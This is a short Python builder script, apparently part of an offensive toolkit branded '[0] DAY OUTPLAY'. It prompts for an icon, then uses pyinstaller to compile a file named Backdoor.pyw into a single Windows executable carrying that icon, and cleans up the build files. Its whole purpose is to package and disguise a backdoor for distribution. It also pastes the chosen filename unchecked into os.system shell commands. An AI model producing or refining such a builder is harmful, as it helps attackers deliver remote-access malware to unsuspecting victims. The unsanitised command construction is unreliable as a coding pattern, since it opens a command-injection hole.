from time import sleep
from tkinter import Tk 
from tkinter.filedialog import askopenfilename
import os



print("""
███╗ ██████╗ ███╗    ██████╗  █████╗ ██╗   ██╗     ██████╗ ██╗   ██╗████████╗██████╗ ██╗      █████╗ ██╗   ██╗
██╔╝██╔═████╗╚██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔═══██╗██║   ██║╚══██╔══╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝
██║ ██║██╔██║ ██║    ██║  ██║███████║ ╚████╔╝     ██║   ██║██║   ██║   ██║   ██████╔╝██║     ███████║ ╚████╔╝ 
██║ ████╔╝██║ ██║    ██║  ██║██╔══██║  ╚██╔╝      ██║   ██║██║   ██║   ██║   ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  
███╗╚██████╔╝███║    ██████╔╝██║  ██║   ██║       ╚██████╔╝╚██████╔╝   ██║   ██║     ███████╗██║  ██║   ██║   
╚══╝ ╚═════╝ ╚══╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝


                            ██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗███████╗
                            ██╔══██╗╚██╗ ██╔╝╚════██╗██╔════╝╚██╗██╔╝██╔════╝
                            ██████╔╝ ╚████╔╝  █████╔╝█████╗   ╚███╔╝ █████╗  
                            ██╔═══╝   ╚██╔╝  ██╔═══╝ ██╔══╝   ██╔██╗ ██╔══╝  
                            ██║        ██║   ███████╗███████╗██╔╝ ██╗███████╗
                            ╚═╝        ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝
                                                 


""")

Tk().withdraw()
while 1:
    print("[+] Choose Icon for the Backdoor\n\n") 
    sleep(3)
    filename = askopenfilename(title="Choose Icon") 
    if filename.split(".")[-1] != "ico":
        print("[!] Please Choose Ico file.\n\n")
    else:
        os.system("pyinstaller --onefile -i " + filename + " " + " Backdoor.pyw")
        os.system("move .\\dist\\Backdoor.exe .\\")
        os.system("rmdir /S /Q dist")
        os.system("rmdir /S /Q build")
        os.system("del Backdoor.spec")
        break
